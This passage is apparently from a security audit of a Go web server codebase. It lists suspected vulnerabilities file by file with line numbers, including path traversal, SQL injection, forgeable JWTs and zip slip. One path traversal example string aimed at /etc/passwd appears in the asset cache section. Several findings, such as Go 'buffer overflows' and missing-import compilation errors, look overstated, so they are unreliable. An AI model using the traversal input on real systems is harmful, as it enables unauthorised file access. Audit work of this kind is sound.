- **Configuration injection** through malicious config data enabling database manipulation

---

## server/endpoint_no_route.go

### Critical Issues
- **Lines 43, 77:** Path traversal vulnerability - file path from URL used directly without comprehensive validation enabling directory traversal
- **Lines 46-47, 103, 124:** Memory exhaustion vulnerability - file caching without proper memory limits and unsafe type assertion
- **Lines 84, 105, 135-139:** Information disclosure - error messages and file system access patterns expose system information
- **Lines 124, 185:** Cache poisoning vulnerability - cache key generation and storage without validation

### File Serving Security Issues
- **Lines 111, 199-237:** Content type confusion - content type determination based solely on file extension without content validation
- **Lines 95-100, 103:** Resource exhaustion - file size checks may not prevent all resource exhaustion scenarios
- **Lines 190-196:** ETag security issues - simple hash function for ETag generation may be predictable
- **No security headers** for served content enables XSS and other attacks

### Cache Security Issues
- **Unsafe type assertion** in cache operations can cause application panics
- **No cache size limits** visible enabling memory exhaustion through cache pollution
- **ETag collision attacks** possible through weak hash function
- **Cache timing attacks** via predictable ETag patterns

---

## server/websockets/websocket_client.go

### Critical Issues
- **Line 54:** Unsafe type assertion `user := u.(*auth.SessionUser)` can panic if context contains wrong type
- **Lines 16, 46:** Global state race condition - maxId variable accessed without synchronization causing ID collisions
- **Lines 47, 48, 104-106, 119-121:** Channel resource leak - channels not properly closed on disconnection
- **Lines 52, 131:** Error information disclosure - detailed error messages exposed to clients

### Security Issues
- **Lines 32, 36:** Function panics instead of returning errors for invalid inputs
- **Lines 71-77, 96-101:** Channel blocking issues - poor handling of full channels causing disconnections
- **Lines 98, 127:** JSON deserialization without validation or size limits
- **Lines 85-139:** Missing context cancellation for long-running goroutines

### Resource Management Issues
- **Memory leaks:** Unclosed channels and abandoned goroutines under error conditions
- **ID collision:** Race conditions in global client ID generation
- **Message loss:** Silent dropping of messages when channels are full

---

## server/websockets/websocket_server.go

### Critical Issues
- **Lines 120, 127:** Client ID integer overflow vulnerability - no bounds checking on client IDs used as map keys
- **Lines 33, 120:** Unbounded client storage - no limit on concurrent clients causing memory exhaustion
- **Lines 101, 136:** Error information disclosure - detailed error messages exposed to clients and logs
- **Lines 101-103:** Insecure WebSocket response - raw error bytes written without validation

### Security Issues
- **Lines 11-16:** Missing input validation for WebSocketPayload and Message types - no size limits
- **Lines 120, 127:** Race condition in client management - concurrent map access without synchronization
- **Lines 74-78:** Broadcast without permission check - sendAll method sends to all clients without authorization
- **Lines 53-58:** Commented authentication code suggests incomplete security implementation

### Resource Management Issues
- **Unlimited connections:** No maximum client limit allowing DoS through connection flooding
- **Map corruption:** Race conditions in client map operations under concurrent access
- **Channel blocking:** Communication channels can fill and block server operations

---

## server/asset_column_sync.go

### Critical Issues
- **Line 42:** Environment variable injection - `os.Getenv("DAPTIN_CACHE_FOLDER")` used directly in path creation allowing path traversal
- **Lines 73-84:** Unsafe task scheduling - tasks created with user-controlled data executed with admin privileges
- **Lines 54-59, 66:** Credential information exposure - raw credentials stored in memory without encryption
- **Lines 42, 47:** Path injection vulnerability - table/column names used in file paths without validation

### Security Issues
- **Lines 18, 47, 56, 81:** Transaction misuse - long-running operations within database transactions causing deadlock risk
- **Lines 21-23, 48-50:** Insufficient error handling - silent failures in critical setup operations
- **Lines 42, 64:** Resource leak potential - temporary directories created without cleanup mechanism
- **Line 82:** Hard-coded schedule configuration - fixed sync intervals without security validation

### Resource Management Issues
- **File system manipulation:** Uncontrolled temporary directory creation through environment injection
- **Credential leakage:** Plain-text credential storage in memory structures
- **Database resource abuse:** Extended transaction locks for file system operations

---

## server/asset_presigned_url.go

### Critical Issues
- **Lines 30-34, 85-86, 90-91, 139-140, etc.:** Credential information exposure - cloud storage credentials accessed without encryption throughout file
- **Lines 38, 85-86, 90-91, 354-359, etc.:** Type assertion vulnerabilities - multiple unsafe type assertions can panic application
- **Lines 41, 54, 71:** Path injection vulnerability - file paths constructed from user input without validation
- **Lines 23, 83, 137, 296, 307, 435:** Insufficient input validation - function parameters not validated for security

### Security Issues
- **Lines 61, 74, 87, 92, 111, etc.:** Error information disclosure - detailed error messages expose system configuration
- **Lines 97, 151, 188, 212, 254, 267:** Hardcoded configuration values - fixed settings without security validation
- **Lines 246-268:** Insufficient access controls - presigned URLs generated without authorization checks
- **Lines 347-384:** Memory management issues - large data structures processed without limits

### Resource Management Issues
- **Cloud credential exposure:** Raw AWS/S3 credentials handled without encryption
- **Memory exhaustion:** Large multipart upload arrays processed without bounds checking
- **Service abuse:** Unlimited presigned URL generation without rate limiting

---

## server/asset_route_handler.go

### Critical Issues
- **Lines 121, 128, 209, 217, 421, 426, 445, 450:** Type assertion vulnerabilities - multiple unsafe type assertions can panic application
- **Lines 236, 268, 388, 427, 451:** Path traversal vulnerability - file paths constructed from user-controlled data without validation
- **Lines 30-35:** Cache key injection - cache key constructed from user input without validation
- **Lines 60, 62, 278, 311, 313:** File name injection - file names used in headers without sanitization

### Security Issues
- **Lines 20-27, 219-228:** Insufficient input validation - URL parameters and query strings not validated
- **Lines 326:** Memory exhaustion risk - file reading with size limits but potential for abuse
- **Lines 89, 97, 239:** Information disclosure - error messages potentially exposing system information
- **Lines 103-178, 186-262:** Resource access control bypass - insufficient permission checks for file access

### Resource Management Issues
- **File system access:** Uncontrolled file access through path traversal vulnerabilities
- **Cache manipulation:** Cache poisoning through user-controlled cache keys
- **Memory abuse:** Large file processing without proper resource limits

---

## server/asset_upload_handler.go

### Critical Issues
- **Lines 102, 175, 387, 397, 420, 421, 458, etc.:** Type assertion vulnerabilities - multiple unsafe type assertions can panic application
- **Lines 178, 190, 286, 323, 430, 442, 590, 602, etc.:** Path injection vulnerability - file paths constructed from user input without validation
- **Lines 174-175, 198, 578-581, 638, 643, 683, etc.:** Credential information exposure - cloud storage credentials accessed without encryption
- **Lines 161, 369, 498:** File upload size bypass - size controls can be bypassed through header manipulation

### Security Issues
- **Lines 31-33, 36, 57, 275, 363-365, 623-624:** Insufficient input validation - URL parameters and form data not validated
- **Lines 108-115, 126-154:** Transaction resource leak - database transactions not properly cleaned up in error scenarios
- **Lines 379-382, 384-385, 455-461, 523:** Metadata injection vulnerability - user-provided metadata used without validation
- **Lines 334-338, 555-568:** Progress tracking information disclosure - upload progress without access controls

### Resource Management Issues
- **Cloud storage abuse:** Unlimited file uploads to cloud storage without proper quotas
- **Transaction leaks:** Database connections held through improper transaction management
- **Memory exhaustion:** Large file processing without size verification

---

## server/assets_column_handler.go

### Critical Issues
- **Lines 12, 17-18, 26:** Global state management risk - global cache variable without synchronization causing race conditions
- **Lines 26-30:** Error handling without security context - cache failures handled insecurely potentially masking security issues
- **Lines 23, 31:** Dependency injection vulnerability - external dependencies passed without validation

### Security Issues
- **Lines 17-19:** Resource leak potential - cache shutdown not guaranteed to be called properly
- **Lines 23:** Missing input validation - function parameters not validated for security

### Resource Management Issues
- **Global state corruption:** Unsynchronized access to global file cache variable
- **Resource leaks:** Cache connections not properly managed during shutdown
- **Service degradation:** Cache failures silently ignored affecting performance

---

## server/banner.go

### Security Issues
- **Lines 6-21:** Information disclosure - banner reveals application name and branding for fingerprinting
- **Lines 6:** Output stream security - direct stdout output without validation or sanitization

### Information Disclosure Issues
- **Application fingerprinting:** Banner identifies DAPTIN instances for targeted attacks
- **Service enumeration:** Reveals application type during reconnaissance
- **Technology stack discovery:** Exposes underlying framework information

---

## server/actions/action_become_admin.go

### Critical Issues
- **Line 33:** Type assertion `user["id"].(int64)` can panic if `user["id"]` is not int64 or nil
- **Unhandled panic scenario:** No recovery mechanism for type assertion failures

### Minor Issues
- **Line 40:** Comment says "failed to rollback" but this is actually a commit operation
- **Unused parameter:** `request actionresponse.Outcome` parameter is not used in DoAction()

---

## server/actions/action_cloudstore_file_delete.go

### Critical Issues
- **Line 39:** Type assertion `inFields["root_path"].(string)` can panic if field is missing or wrong type
- **Line 54:** Type assertion `credentialName.(string)` can panic inside if statement

### Security Issues
- **Path traversal potential:** No validation on `rootPath` construction - could allow accessing unauthorized paths
- **Credential exposure:** Config values set globally without cleanup

### Logic Issues
- **Lines 81-83:** If both `operations.Delete()` and `operations.Purge()` fail, still returns success response
- **Line 85:** Uses `InfoErr` which might not properly surface critical failures

---

## server/actions/action_cloudstore_file_upload.go

### Critical Issues
- **Line 91:** Type assertion `inFields["path"].(string)` can panic if field missing/wrong type
- **Line 143:** Type assertion `inFields["root_path"].(string)` can panic if field missing/wrong type
- **Line 96:** Type assertion `fileInterface.(map[string]interface{})` can panic if wrong type
- **Line 159:** Type assertion `credentialName.(string)` can panic inside if statement

### Resource Leak Issues
- **Lines 60, 66:** Deferred `fileReader.Close()` and `targetFile.Close()` in loop - if early return occurs, resources leak
- **Multiple goroutines:** Creates unlimited goroutines without tracking or cleanup
- **Global state pollution:** `cleanuppath` map grows without bounds

### Security Issues
- **Path traversal:** No validation on file names in ZIP extraction (line 50)
- **Directory traversal:** Zip slip vulnerability - malicious ZIP could write outside target directory

---

## server/resource/resource.go

### Critical Issues
- **Line 72:** Type assertion `v.Interface().([]uint8)` can panic if Interface() doesn't return []uint8
- **Line 98:** Type assertion `s.row[s.colNames[i]].(string)` can panic if row value is not a string
- **Line 53:** Double reflection `reflect.ValueOf(reflect.ValueOf(x).Elem().Interface())` - Elem() calls on non-pointer types cause panics

### Memory Management Issues
- **Lines 46-48:** Manual memory allocation without corresponding cleanup
- **Line 100:** Comment indicates awareness of existing bugs in pointer management
- **Memory leaks:** Potential memory leaks in long-running processes from unmanaged allocations

### Reflection Security Issues
- **Line 80:** Default case exposes unexpected data types through reflection without validation
- **No validation:** No type validation before reflection operations

---

## server/resource/dbresource.go

### CRITICAL Security Issues
- **Lines 85-87:** Environment variable parsing without bounds checking - `strings.Index(env, "=")` can return -1 causing panic
- **Line 86:** Buffer overflow if environment variable doesn't contain "=" - `env[0:strings.Index(env, "=")]` with -1 index
- **Lines 319, 331:** UUID conversion errors ignored - `uuid.FromBytes(id[:])` with error discarded using `_`

### Authentication Bypass Vulnerabilities  
- **Line 332:** Cache key injection - `key := "admin." + string(userReferenceId.UserReferenceId[:])` allows cache key manipulation
- **Lines 333-337:** Admin group hardcoding with ID 2 creates single point of failure
- **Lines 287-305:** Binary unmarshaling without bounds checking in AdminMapType.UnmarshalBinary

### Transaction Management Issues
- **Lines 93-103:** Transaction leak if GetIdToReferenceIdWithTransaction fails - transaction never rolled back
- **Resource exhaustion:** Unclosed transactions can exhaust database connection pool

### SQL Injection Vulnerabilities
- **Lines 160-161:** Dynamic SQL construction with user-controlled typeName in `From(typeName)`
- **Lines 213-214:** Group name injection in WHERE clause construction

### Memory Safety Issues
- **Line 299:** Buffer overflow in binary unmarshaling - `copy(key[:], data[i:i+uuidSize])` without bounds checking
- **Line 300:** Out-of-bounds access - `data[i+uuidSize]` without length validation

---

## server/resource/credentials.go

### CRITICAL Security Issues
- **Lines 18, 40:** Type assertions `credentialRow["content"].(string)` can panic if content is not string or nil
- **Line 48:** Type assertion `credentialRow["name"].(string)` can panic if name field is missing or wrong type
- **Lines 16, 38:** Encryption secret retrieval errors ignored with `_` - could use empty/invalid encryption secrets

### Credential Security Vulnerabilities
- **Lines 16, 38:** No validation of encryption secret strength or format - weak secrets could compromise all credentials
- **Lines 21, 43:** JSON unmarshaling without size limits - DoS through large credential payloads
- **Missing access logging:** No audit trail for credential access operations
- **Memory exposure:** Decrypted credentials kept in memory as strings without secure cleanup

### Input Validation Issues
- **Line 9:** No validation of credentialName parameter - could allow SQL injection
- **Line 31:** No validation of referenceId format or content
- **No size limits:** No limits on credential content size during retrieval

---

## server/resource/encryption_decryption.go

### CRITICAL Cryptographic Issues
- **Line 40:** Base64 decoding error completely ignored with `_` - silent failures allow cryptographic bypass
- **Line 40:** Empty or corrupted ciphertext processed without validation after failed base64 decode
- **Lines 49-51:** No maximum size limits on ciphertext - DoS through memory exhaustion possible

### Cryptographic Security Gaps
- **CFB Mode:** No authenticated encryption - ciphertext is malleable and vulnerable to bit-flipping attacks
- **Missing integrity:** No verification that decrypted data hasn't been tampered with
- **No key validation:** Keys not validated for strength or appropriate length before use
- **Error information leakage:** Spelling error "Chipher" in error messages indicates code quality issues

---

## server/rootpojo/data_import_file.go

### Information Disclosure Issues
- **Lines 5-7:** String() method exposes full file paths in logs and error messages - `fmt.Sprintf("[%v][%v]", s.FileType, s.FilePath)`
- **Security risk:** File system structure and sensitive paths disclosed through application logs

### Path Traversal Vulnerabilities
- **Line 10:** FilePath field has no validation - allows "../" sequences for directory traversal
- **No sanitization:** File paths not cleaned or validated before use
- **Missing constraints:** No length limits or format validation on any string fields

---

## server/statementbuilder/statement_builder.go

### Global State Security Issues
- **Lines 12, 16:** Global variable `Squirrel` modified without synchronization - race conditions in concurrent applications
- **Line 16:** No input validation on `dbTypeName` parameter - could cause runtime errors with invalid dialect names
- **Missing error handling:** No validation that dialect initialization succeeded

---

## server/subsite/subsite_staticfs_server.go

### CRITICAL Path Traversal Vulnerabilities
- **Lines 13, 15:** No path validation on `name` parameter - allows "../" directory traversal to access files outside web root
- **Line 15:** Fallback path `pageOn404` not validated - could serve arbitrary files if manipulated
- **Complete file system access:** Path traversal could expose sensitive files like /etc/passwd, configuration files

### Error Handling Issues
- **Line 15:** No error handling when fallback page fails to open - could cause application crashes
- **Missing resource cleanup:** No proper file handle management in error conditions

---

## server/subsite/template_handler.go

### CRITICAL Type Assertion Vulnerabilities
- **Lines 105, 126, 277-279:** Unsafe type assertions without validation - `templateRow["url_pattern"].(string)`, `attrs["content"].(string)` etc can panic
- **Application crashes:** Runtime panics when database fields are not expected types

### CRITICAL Cache Key Injection
- **Lines 58, 62, 70, 82:** User-controlled data directly used in cache keys - URL path, query params, headers used without validation
- **Cache poisoning:** Attackers can craft URLs/headers to poison cache entries and serve malicious content

### Base64 and Content Security Issues
- **Lines 361-367:** Base64 decoding without size limits or proper error handling - silent failures return empty string
- **Lines 188, 190:** File path injection in Content-Disposition headers - user-controlled paths used without validation
- **Line 462:** Weak ETag generation using only 8 bytes of SHA256 hash - potential for collisions

### Action Request Injection
- **Lines 253-265:** Action request processing with user-controlled data - `actionRequest.Attributes = inFields` allows injection

---

## server/subsite/utils.go

### CRITICAL Type Assertion Vulnerability
- **Line 8:** Unsafe type assertion `message[0].(string)` without validation - can panic if first parameter is not string or if message slice is empty
- **No bounds checking:** Direct slice access without validating slice has elements

### Log Injection Vulnerabilities  
- **Lines 8, 14:** User-controlled format strings used directly in logging - `log.Errorf(fmtString+": %v", args...)`
- **Format string attacks:** User-controlled fmtString allows format string injection and log manipulation

---

## server/subsite/get_all_subsites.go

### Error Handling and Data Integrity Issues
- **Lines 41-43:** Inconsistent error handling - struct scan errors logged but not returned, partial data still added to results
- **Lines 58-62:** N+1 query pattern - individual permission queries for each site causing database performance issues
- **Missing input validation:** No validation of resourceInterface or transaction parameters

---

## server/subsite/subsite_action_config.go

### CRITICAL Type Assertion and JSON Vulnerabilities
- **Line 13:** Unsafe type assertion `actionRequestInt.(string)` without validation - can panic if input is not string
- **Line 17:** JSON unmarshaling without size limits or validation - `json.Unmarshal([]byte(actionReqStr), &actionRequest)`
- **JSON injection:** User-controlled JSON configuration allows injection of malicious structures and memory exhaustion

---

## server/subsite/subsite_cache_config.go

### CRITICAL Type Assertion and JSON Vulnerabilities
- **Line 106:** Unsafe type assertion `cacheConfigInterface.(string)` without validation - can panic if input is not string
- **Line 111:** JSON unmarshaling without size limits or validation - `json.Unmarshal([]byte(actionReqStr), &cacheConfig)`
- **JSON injection:** User-controlled cache configuration allows injection of malicious structures

### Cache Configuration Security Issues
- **Lines 47-48:** User-controlled custom headers without validation - `CustomHeaders map[string]string` allows HTTP header injection
- **Line 57:** User-controlled cache key prefix without validation - `CacheKeyPrefix string` allows cache key manipulation
- **No bounds checking:** Numeric values like MaxAge, cache sizes have no validation or limits

---

## server/table_info/tableinfo.go

### Data Structure Security Issues
- **Lines 44, 55:** Methods return pointers to internal slice elements - allows external modification of internal data
- **Lines 71-79:** Hash collision handling incomplete - duplicate detection relies only on hash comparison without fallback validation
- **Missing input validation:** No validation of name parameters in lookup methods for length or dangerous characters
- **No bounds checking:** Unlimited relation additions without size limits could cause memory exhaustion

---

## server/actions/action_site_sync_storage.go

### Critical Security Vulnerabilities
- **Line 114:** **POTENTIAL CODE EXECUTION** - Hugo command executed with user-controlled source directory
- **Line 37:** Type assertion `inFields["path"].(string)` can panic if field missing or wrong type
- **Line 55:** `resource.CheckErr()` may panic instead of returning error
- **Line 64:** **CRITICAL BUG:** Overwrites transaction pointer contents causing memory corruption

### Security Issues
- **SQL injection:** Raw query execution without validation or sanitization
- **Path injection:** User-controlled paths used directly in filesystem operations without validation
- **Credential exposure:** Cloud credentials set in global rclone config accessible to all operations
- **No input validation:** Source and destination paths not validated for security

### Command Execution Security Issues
- **Hugo command injection:** Hugo executed with user-controlled directory paths
- **No command validation:** No validation of Hugo command parameters
- **Process execution:** External processes executed without sandboxing
- **No resource limits:** No limits on Hugo build time or resource usage

---

## server/actions/action_switch_session_user.go

### Critical Security Vulnerabilities
- **Uninitialized security fields:** secret, tokenLifeTime, and jwtTokenIssuer not initialized in constructor
- **Broken JWT security:** Tokens signed with nil/zero secret making them forgeable
- **Line 44:** Type assertion `inFieldMap["password"].(string)` can panic if not string
- **Line 65:** Password comparison vulnerable to timing attacks
- **Line 72:** Clock skew adjustment creates time in past, not allowing for skew

### Authentication Security Issues
- **No rate limiting:** Vulnerable to brute force password attacks
- **No account lockout:** No protection against repeated failed login attempts
- **No user status validation:** No checks for disabled, suspended, or unconfirmed accounts
- **Weak password policy:** No validation of password complexity requirements

### JWT Security Issues
- **Token forgery risk:** Uninitialized secret allows token forgery
- **No token revocation:** No mechanism to revoke or blacklist tokens
- **No refresh tokens:** No secure token refresh mechanism
- **Information disclosure:** JWT contains user information in readable format

---

## server/actions/action_transaction.go

### Critical Security Vulnerabilities
- **Line 35:** **SQL injection** - Raw SQL queries executed without validation or sanitization
- **Line 64:** **CRITICAL BUG** - Transaction pointer overwrite can cause memory corruption
- **Arbitrary code execution:** Any SQL query can be executed with database privileges
- **Privilege escalation:** No authorization checks for database operations

### Runtime Safety Issues
- **Type assertion panics:** Multiple type assertions can panic if fields missing or wrong type (lines 23, 35, 36, 50)
- **Transaction state corruption:** begin operation overwrites existing transaction causing undefined behavior
- **Resource leaks:** No guarantee of proper transaction cleanup on errors

### Database Security Issues
- **No query validation:** No validation of SQL query syntax or permissions
- **No access control:** No checks for table or column access permissions
- **Information disclosure:** Query results expose arbitrary database contents
- **Data modification:** Can execute INSERT, UPDATE, DELETE operations without restrictions

---

## server/actions/action_xls_to_entity.go

### Critical Security Vulnerabilities
- **Line 141:** **Arbitrary file upload** - Uploads files to server file system without validation
- **Path traversal:** File names not validated, allowing directory traversal attacks
- **No file type validation:** Accepts any file claiming to be XLS without verification
- **No authentication:** No validation of user permissions to upload files or modify schema
- **Line 132:** Base64 decoding without validation can cause buffer overflows

### Runtime Safety Issues
- **Type assertion panics:** Multiple type assertions can crash application (lines 100, 102, 129, 190)
- **Line 136:** `resource.CheckErr()` may panic instead of returning error
- **Line 251:** Missing import - Code uses `json.Marshal()` without importing package
- **Resource exhaustion:** No limits on file size or processing time

### Database Security Issues
- **Schema modification:** Can create arbitrary database tables and columns
- **Data injection:** Imported data not validated or sanitized
- **Mass data import:** Can import unlimited amounts of data
- **No rollback:** No mechanism to rollback schema or data changes

### File System Security Issues
- **Directory traversal:** Uploaded files written to arbitrary paths
- **File overwrite:** Can overwrite existing files without validation
- **Disk space exhaustion:** No limits on file sizes or disk usage
- **No cleanup:** Uploaded files may not be properly cleaned up

---

## server/actions/streaming_export_writers.go

### Critical Security Vulnerabilities
- **XSS in HTML export:** HTML output includes unescaped user data and client-side JavaScript
- **CSV injection:** No protection against CSV formula injection attacks
- **Excel injection:** No protection against Excel formula injection attacks
- **PDF exploitation:** PDF generation without sanitization may enable PDF-based attacks
- **HTML injection:** Incomplete HTML escaping allows potential XSS

### Input Validation Issues
- **No data sanitization:** User data not sanitized before export
- **No size limits:** No limits on export size or memory usage
- **No type validation:** Data types not validated before formatting
- **No column name validation:** Table and column names not validated
- **Unsafe type assertions:** Type assertions without proper error handling

### Client-Side Security Issues
- **JavaScript injection:** HTML export includes client-side JavaScript
- **No CSP protection:** No Content Security Policy headers
- **DOM manipulation:** Client-side code manipulates DOM without validation
- **Event handlers:** Inline event handlers in HTML output

### Resource Management Issues
- **Memory exhaustion:** Large exports can consume excessive memory
- **No streaming limits:** No limits on concurrent export operations
- **Buffer overflow risk:** Unlimited buffer growth in streaming writers
- **File handle leaks:** Potential file handle leaks in XLSX/PDF writers

---

## server/actions/streaming_import_parsers.go

### Critical Security Vulnerabilities
- **JSON bomb attacks:** No limits on JSON file size or structure depth
- **Excel zip bomb:** XLSX files can contain zip bombs causing resource exhaustion
- **CSV injection:** No protection against CSV formula injection attacks
- **Type assertion panics:** Multiple unsafe type assertions can crash application
- **Memory exhaustion:** All parsers load entire files into memory

### Runtime Safety Issues
- **Line 67:** Type assertion `tableData.([]interface{})` can panic if not array
- **Line 75:** Type assertion `rowData.(map[string]interface{})` can panic if not object
- **Line 251:** Index out of bounds access when k >= len(row) in CSV parser
- **Missing error handling:** Many operations lack proper error handling

### Input Validation Issues
- **No file size limits:** Parsers accept arbitrarily large files
- **No structure validation:** JSON/CSV structure not validated before processing
- **No content sanitization:** File contents not sanitized before parsing
- **File type spoofing:** Content-based detection can be spoofed
- **No schema validation:** No validation that imported data matches expected schema

### Memory Management Issues
- **Memory exhaustion:** All formats load entire files into memory
- **No streaming:** Despite "streaming" name, parsers are not truly streaming
- **Resource leaks:** XLSX files may leave file handles open
- **Unbounded growth:** No limits on number of tables/columns/rows

---

## server/actions/utils.go

### Critical Runtime Safety Issues
- **Line 73:** `headerRow.GetCell(i).Value` can panic if headerRow is nil or cell doesn't exist
- **Line 87:** `sheet.Row(i)` can return nil causing panic on subsequent access  
- **Line 90:** `currentRow.GetCell(j).Value` can panic if currentRow is nil
- **Line 95:** Index out of bounds access `properColumnNames[j]` without bounds checking
- **No nil pointer checks:** Multiple locations assume non-nil pointers without validation

### Logic and Bounds Issues
- **Loop bounds:** Loops use sheet.MaxRow/MaxCol without validating actual data bounds
- **Empty cell handling:** Inconsistent handling of empty cells across functions
- **Column count mismatch:** No validation that data rows have same column count as headers
- **Memory exhaustion:** GetDataArray() loads entire sheet into memory without limits

### Input Validation Issues
- **No parameter validation:** Functions don't validate input parameters for nil or invalid values
- **No size limits:** No limits on string lengths or sheet dimensions
- **No sanitization:** Cell values not sanitized before processing
- **Unicode handling:** String functions may not handle Unicode correctly

---

## server/apiblueprint/apiblueprint.go

### Critical Runtime Safety Issues
- **Line 22:** Type assertion `args[0].(string)` can panic if first argument is not string
- **Line 51:** Type assertion `s[0].(string)` can panic in WriteStringf() method
- **Lines 111-116:** Type assertions for enum values without validation can cause panics
- **No nil pointer checks:** Multiple map accesses without validation

### Information Disclosure Issues
- **Database schema exposure:** Complete database structure exposed in API documentation
- **Internal system details:** Error messages and configuration details revealed
- **Action parameter exposure:** All action parameters and validation rules exposed
- **Relationship mapping disclosure:** Complete entity relationship graph exposed

### Security Documentation Issues
- **Comprehensive attack surface:** API documentation provides complete attack surface map
- **Parameter enumeration:** All possible parameters and validation rules exposed
- **Endpoint discovery:** All available endpoints and methods documented
- **Authentication bypass info:** Documentation reveals authentication mechanisms

### Input Validation Issues
- **No input sanitization:** User-provided descriptions and metadata not sanitized
- **No length limits:** No limits on generated documentation size
- **XSS in documentation:** Generated HTML/markdown may contain unescaped content

### API Security Issues
- **Complete enumeration:** Provides complete map of available attack vectors
- **Parameter discovery:** Reveals all input parameters for security testing
- **Response format disclosure:** Shows exact response formats for attacks
- **Configuration exposure:** System configuration details in documentation

---

## server/assetcachepojo/asset_cache.go

### Critical Security Vulnerabilities
- **Line 27:** Path traversal in `GetFileByName()` - fileName not validated (../../../etc/passwd)
- **Line 146:** Path traversal in `DeleteFileByName()` - can delete any system file
- **Line 152:** Path traversal in `GetPathContents()` - can list any directory
- **Lines 204,207:** Path traversal in `UploadFiles()` - user-controlled file paths
- **Line 210:** Files written with 0777 permissions exposing sensitive data

### Runtime Safety Issues
- **Line 181:** Type assertion `files[i].(map[string]interface{})` can panic
- **Line 204:** Type assertion `file["path"].(string)` can panic
- **Line 207:** Type assertion `file["name"].(string)` can panic
- **Line 227:** `panic(err)` crashes application instead of error handling
- **Race conditions:** Concurrent access to same files not handled

### Authentication and Authorization Issues
- **No access control:** No validation of user permissions for file operations
- **No authorization checks:** Any user can read/write/delete any cached file
- **Credential exposure:** Cloud credentials stored in global rclone config
- **No audit logging:** File operations not logged for security monitoring

### File System Security Issues
- **Arbitrary file access:** Can access any file on the system through path traversal
- **Arbitrary file deletion:** Can delete critical system files
- **Directory traversal:** Can create files/directories anywhere on filesystem
- **Overly permissive file permissions:** Files created with 0777 permissions
- **Predictable temp files:** Temporary file names are predictable

### Cloud Storage Security Issues
- **Credential pollution:** Cloud credentials stored in global configuration
- **No credential cleanup:** Credentials persist in global config after use
- **Arbitrary cloud access:** Can download from any configured cloud storage
- **External service dependency:** Vulnerable to cloud storage service attacks

### Resource Management Issues
- **No size limits:** Files can be arbitrarily large causing disk exhaustion
- **No disk space checks:** No validation of available disk space
- **Memory usage:** Large files processed entirely in memory
- **Unbounded downloads:** No limits on download duration or bandwidth

---

## server/auth/auth.go

### Critical Security Vulnerabilities
- **Lines 301-302:** Type assertions on JWT claims can panic if malformed token
- **Line 171:** Array bounds access without validation can cause panic  
- **Line 376:** Type assertion on user ID creation can fail silently
- **Line 360:** Automatic user creation uses potentially excessive DEFAULT_PERMISSION
- **Lines 353-401:** OAuth users automatically created without proper validation

### Authentication Security Issues
- **No rate limiting:** Basic auth vulnerable to brute force attacks
- **Information leakage:** Email addresses used in JWT claims and error messages
- **Weak permission model:** DEFAULT_PERMISSION_WHEN_NO_ADMIN grants excessive access
- **Global state:** JWT middleware stored in global variable creating race conditions
- **Token extraction:** Multiple token sources increase attack surface

### Session Management Issues
- **Cache poisoning:** User sessions cached without proper validation
- **No session invalidation:** Cached sessions persist even after password changes
- **Permission persistence:** User permissions cached for 10 minutes without updates
- **Distributed cache:** No encryption or integrity protection for cached user data
- **Memory leaks:** Local cache maps grow without cleanup

### Database Security Issues
- **SQL injection potential:** Dynamic query construction in user lookup
- **Transaction abuse:** Read-only operations use unnecessary transactions
- **No prepared statement caching:** Performance and resource issues
- **Password hash exposure:** Password hashes retrieved on every authentication

### Runtime Safety Issues
- **Multiple type assertions:** Numerous unsafe type assertions throughout codebase
- **Array bounds access:** No validation of array/slice access
- **Nil pointer dereferences:** Insufficient nil checking
- **Resource leaks:** Database connections and prepared statements may leak

### Authorization Issues
- **Permission escalation:** Users can potentially gain unauthorized permissions through caching
- **No audit logging:** Authentication and authorization events not logged
- **Weak default permissions:** System defaults may grant excessive access
- **Group permission complexity:** Complex group permission model hard to audit

### Cache Security Issues
- **Cache corruption:** No validation of cached user data integrity
- **Distributed cache:** Sensitive user data stored in distributed cache without encryption
- **Cache timing:** Cache expiration not synchronized with security events
- **No cache eviction:** Manual cache clearing not implemented

### Memory Issues
- **Base64 loading:** Entire file contents loaded into memory simultaneously
- **No size limits:** No validation on file sizes before processing

### Logic Issues
- **Line 138:** `resource.CheckErr(err, "Failed to remove cache folder: %s", tempDirectoryPath)` called outside file processing loop with potentially stale error
- **Inconsistent error handling:** Some errors cause continue, others cause panic, some logged but ignored
- **Success response:** Always returns success even if upload fails

### Race Conditions
- **Cleanup mechanism:** Potential race between cleanup goroutine and subsequent uploads
- **File system operations:** No atomic operations for file creation/cleanup

---

## server/actions/action_integration_install.go

### 🚨 Compilation Errors
- **Line 59:** `json.Unmarshal()` called but `json` package not imported - **COMPILATION ERROR**
- **Line 81:** `json.Unmarshal()` called but `json` package not imported - **COMPILATION ERROR**
- **Undefined constants/functions:** ModeRequest and excludeFromMode referenced but not defined in this file

### ⚠️ Runtime Safety Issues
- **Lines 51, 53, 120, 214:** Panic-prone type assertions with no error handling
- **Line 120:** Array bounds access `router.Servers[0]` without checking if servers exist
- **Unused struct fields:** Most integrationInstallationPerformer fields never used after initialization

### 🔐 Security Concerns
- **No input validation:** OpenAPI specifications processed without security validation
- **Parameter injection:** URL parameters used without sanitization
- **Authentication exposure:** Decrypted authentication data handled without proper validation

---

## server/actions/action_integration_execute.go

### 🚨 Compilation Errors
- **Lines 78, 708, 726:** `json.Unmarshal()` called but `json` package not imported - **COMPILATION ERROR**

### ⚠️ Runtime Safety Issues
- **Multiple type assertions:** Lines 120, 125, 159, 156, 215-216, 267, etc. can panic on type mismatches
- **OAuth token handling:** No validation that OAuth tokens are valid before use
- **Recursive processing:** Deep schema nesting could cause stack overflow

### 🔐 Security Concerns
- **URL parameter injection:** No validation or sanitization of URL parameters
- **External API calls:** Makes HTTP requests without rate limiting or timeout controls
- **Authentication token exposure:** OAuth and API tokens used without encryption in transit

---

## server/actions/action_mail_send_ses.go

### ⚠️ Runtime Safety Issues
- **Lines 37-39, 47-50, 82, 91:** Panic-prone type assertions with no error handling
- **Line 155:** Encryption secret retrieval error silently ignored

### 🔐 Security Concerns
- **Credential exposure:** AWS credentials handled in plaintext without encryption
- **No email validation:** Email addresses not validated before sending to AWS SES
- **No rate limiting:** No protection against email spam or abuse
- **Unused security fields:** encryptionSecret stored but never used

---

## server/actions/action_mail_send.go

### ⚠️ Runtime Safety Issues
- **Lines 36-39, 97:** Panic-prone type assertions with no error handling
- **Line 84:** `resource.CheckErr()` may panic instead of returning error
- **Line 112:** No error handling for PEM decode operation

### 🔐 Security Concerns
- **Debug output exposure:** Email content printed to stdout (lines 100, 151)
- **Private key exposure:** DKIM private keys loaded and used without additional protection
- **No input sanitization:** Email headers and body not sanitized for injection attacks
